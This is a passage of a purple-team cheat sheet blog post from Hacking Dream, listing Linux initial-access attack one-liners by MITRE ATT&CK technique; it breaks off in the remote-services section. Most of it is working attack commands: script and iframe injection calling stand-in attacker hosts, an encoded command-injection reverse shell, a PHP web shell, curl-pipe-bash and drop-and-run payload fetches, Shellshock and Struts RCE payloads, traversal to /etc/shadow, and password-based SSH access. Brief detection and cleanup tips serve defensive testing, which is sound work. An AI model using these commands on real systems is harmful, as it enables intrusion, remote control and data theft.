---
title: MITRE ATTACK Tactic TA0001 Initial Access: Linux Purple Team Cheat Sheet
url: https://www.hackingdream.net/2025/06/mitre-attack-tactic-ta0001-initial-access-purple-team-cheatsheet.html
source: Hacking Dream
date: 2025-06-13
fetch_date: 2025-10-06T22:53:25.033699
---

# MITRE ATTACK Tactic TA0001 Initial Access: Linux Purple Team Cheat Sheet

* [Home](http://www.hackingdream.net)
* [About Author](http://www.hackingdream.net/p/about-author.html)
* [Contact US](http://www.hackingdream.net/p/contact-us.html)

[# ![Hacking Dream](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgI3MZul9awsB7xmLlAs9J9xDOsiYxbMQoa4EQkvg9T9oe4q5zkZRqV0W4UN2KhrQQWPLveTvQ9kkuHu2HfrahqY0Gc53G1cVCwQNY2G3MVkEOJoDvLIK9lFtBUc-HhRciiteWdHYV4SaE/s1600/Size-Modified.png)](https://www.hackingdream.net/)

Main menu

close

* [Home](http://www.hackingdream.net)
* [AI Sec](https://www.hackingdream.net/search/label/AI)
* [AI Pentest](http://www.hackingdream.net/search/label/AI%20Attacks)
* [Cheatsheets](https://www.hackingdream.net/search/label/Cheatsheet)
* [Pentest](https://www.hackingdream.net/search/label/Pentest)
* [\_Active Directory](https://www.hackingdream.net/search/label/Active%20Directory)
* [\_Linux](http://www.hackingdream.net/search/label/Kali%20Linux)
* [\_Wireless](http://www.hackingdream.net/search/label/Wifi%20Hacking)
* [\_Target Hacking](http://www.hackingdream.net/search/label/Target%20Hacking)
* [Purple Team](https://www.hackingdream.net/search/label/Purple%20Team)
* [Bin Exp](https://www.hackingdream.net/search/label/Exploitation)
* How To
* [\_Blogging](http://www.hackingdream.net/search/label/Blogging)
* [\_Solved Problems](http://www.hackingdream.net/search/label/Solved%20Problems)
* [\_Money Making](http://www.hackingdream.net/search/label/Money%20Making)
* [\_Top Ten](http://www.hackingdream.net/search/label/Top%20Ten)
* [\_Gaming](http://www.hackingdream.net/search/label/Games)

### MITRE ATTACK Tactic TA0001 Initial Access: Linux Purple Team Cheat Sheet

[June 13, 2025](https://www.hackingdream.net/2025/06/mitre-attack-tactic-ta0001-initial-access-purple-team-cheatsheet.html "permanent link")

Linux Initial Access Commands Cheat-Sheet: Ultimate TA0001 Guide

# Linux Initial Access Commands Cheat-Sheet – TA0001

*Updated on 11 August 2025*

* [T1659 – Content Injection](#t1659-content-injection)
* [T1189 – Drive-by Compromise](#t1189-drive-by-compromise)
* [T1190 – Exploit Public-Facing Application](#t1190-exploit-public-facing-application)
* [T1133 – External Remote Services](#t1133-external-remote-services)
* [T1200 – Hardware Additions](#t1200-hardware-additions)
* [T1566 – Phishing & Sub-Techniques](#t1566-phishing)
* [T1091 – Replication Through Removable Media](#t1091-removable-media)
* [T1195 – Supply-Chain Compromise & Sub-Techniques](#t1195-supply-chain-compromise)
* [T1199 – Trusted Relationship](#t1199-trusted-relationship)
* [T1078 – Valid Accounts & Sub-Techniques](#t1078-valid-accounts)
* [Caldera integration tips](#caldera-integration)
* [Conclusion](#conclusion)

Purple teaming lives or dies on **coverage**. The more *distinct* ways you can trigger an Initial-Access alert, the faster you uncover gaps in SIEM, EDR, Anti-Virus solutions. Every section below gives you:

1. **Why it matters** – threat context in one sentence.
2. **One-liners, lots of them** – each line is a stand-alone bash command. If one action depends on another, it’s chained with `&&` so you still get a single copy-/paste line.
3. **Blue-team watch-outs** – artefacts defenders should see.
4. **Cleanup tip** – a single command to reset the host so you can rerun the test.

For deeper MITRE background, read [MITRE ATT&CK TA0001](https://attack.mitre.org/tactics/TA0001/), and explore CALDERA’s documentation [here](https://caldera.readthedocs.io/en/latest/). Looking for other cheat sheets ? [Linux Privilege Escalation Commands](https://www.hackingdream.net/2020/03/linux-privilege-escalation-cheatsheet-for-oscp.html) and here is [Windows Privilege Escalation command and Techniques](https://www.hackingdream.net/2020/03/windows-privilege-escalation-cheatsheet-for-oscp.html) or [AD PENTEST CHEAT SHEET - RECON & INITIAL ACCESS](https://www.hackingdream.net/2021/04/active-directory-penetration-testing-cheatsheet.html)

[![MITRE ATTACK Tactic TA0001 Initial Access: Linux Purple Team Cheat Sheet](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiAsHZufdcYXv9TLJ36EdH927BKqQF2gTJD6fe8RHH__Y8OGWcLSLJtfE0YWPEgHn2z0uwK1PibzbOYoB8CuqeNie0wcVQg2PLug_7ulrvxF0C_co30dMwbvhmeGBBn290N-QgX8ME5k51knX_2kvWcYG3iucWnnLaGdqFCOOLajFqX6gKZVTO7TwonvQdG/w640-h314/MITRE-ATTACK-Tactic-TA0001-Initial-Access.jpg "MITRE ATTACK Tactic TA0001 Initial Access: Linux Purple Team Cheat Sheet")](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiAsHZufdcYXv9TLJ36EdH927BKqQF2gTJD6fe8RHH__Y8OGWcLSLJtfE0YWPEgHn2z0uwK1PibzbOYoB8CuqeNie0wcVQg2PLug_7ulrvxF0C_co30dMwbvhmeGBBn290N-QgX8ME5k51knX_2kvWcYG3iucWnnLaGdqFCOOLajFqX6gKZVTO7TwonvQdG/s1024/MITRE-ATTACK-Tactic-TA0001-Initial-Access.jpg)

## T1659 – Content Injection

**Why it matters** — attackers plant malicious markup or code in otherwise legitimate pages/services.

```
# Inject rogue <script> into Apache index
sudo sed -i '1i <script src="http://evil.example/payload.js"></script>' /var/www/html/index.html

# Inject Iframe
LOGIN_IFRAME="<iframe src='http://attacker-server/phish.html' style='position:fixed; top:0; left:0; bottom:0; right:0; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;'></iframe>"
sudo sed -i "/<body.*>/a ${LOGIN_IFRAME}" /var/www/html/index.php

# Reverse shell
curl "http://vulnerable-app/tools/ping.php?host=127.0.0.1%3B%20bash%20-c%20'bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.10.5%2F4444%200%3E%261'"

# Inline PHP web-shell
printf '<?php system($_GET["cmd"]); ?>' | sudo tee /var/www/html/info.php
```

*Watch for* WAF hits, FIM hash changes, `www-data` spawning shells.
*Cleanup* `git -C /var/www/html checkout -- . && sudo rm /var/www/html/info.php`

## T1189 – Drive-by Compromise

**Why it matters** — one browser visit, one payload.

```
# Host a tiny exploit kit
python3 -m http.server 8080 --directory /tmp/exploit_kit --bind 0.0.0.0

# curl | bash installer
curl -fsSL [http://malicious.example/installer](http://malicious.example/installer) | bash -s -- --silent

# Drop-and-run shell script
curl -s [http://malicious.example/drop.sh](http://malicious.example/drop.sh) -o /tmp/drop.sh && chmod +x /tmp/drop.sh && /tmp/drop.sh

# Grab watering-hole page for offline triage
wget -O /tmp/malicious.html [http://compromised-site.com/index.html](http://compromised-site.com/index.html)

# Force a live browser hit
xdg-open [http://malicious.example](http://malicious.example) || true
```

*Watch for* new `/tmp` binaries, outbound DNS/HTTP to fresh domains, SentinelOne exploit heuristics.
*Cleanup* `rm -f /tmp/drop.sh /tmp/malicious.*`

## T1190 – Exploit Public-Facing Application

**Why it matters** — one unpatched CVE can hand over a shell.

```
# Shellshock RCE proof
curl -H 'User-Agent: () { :;}; /bin/bash -c "touch /tmp/shellshock_pwned"' http://127.0.0.1/cgi-bin/status || true

# Apache Struts OGNL RCE (whoami)
curl -X POST "[http://target-server/struts2-showcase/](http://target-server/struts2-showcase/)" -H "Content-Type: application/x-www-form-urlencoded"
-d "name=%{(#dm=@ognl.OgnlContext\@DEFAULT\_MEMBER\_ACCESS).(#cmd='whoami').(#p=new java.lang.ProcessBuilder({'bash','-c',#cmd})).(#p.redirectErrorStream(true)).(#p.start())}"

# XXE to read /etc/passwd
curl -d '\' [http://127.0.0.1/upload?debug=true](http://127.0.0.1/upload?debug=true)

# Path-traversal via netcat
printf 'GET /../../../../etc/shadow HTTP/1.0\r\n\r\n' | nc 127.0.0.1 8080

# sqlmap dump (no interaction)
sqlmap -u "[http://target-server/vuln.php?id=1](http://target-server/vuln.php?id=1)" --batch --dbs
```

*Watch for* IDS exploit signatures, error spikes, web-server child shells.
*Cleanup* `killall sqlmap; rm /tmp/shellshock_pwned`

## T1133 – External Remote Services

**Why it matters** — stolen creds + SSH/VPN/RDP = stealthy foothold.

```
# Key-based SSH
ssh -o StrictHostKeyChecking=no attacker@10.0.0.2 'hostname && id'

# sshpass password auth
sshpass -p 'P\@ssw0rd!' ssh attacker\@10.0.0.2 'echo \$(date) >> \~/.owned'

# File exfil via SFTP
sftp -oBatchMode...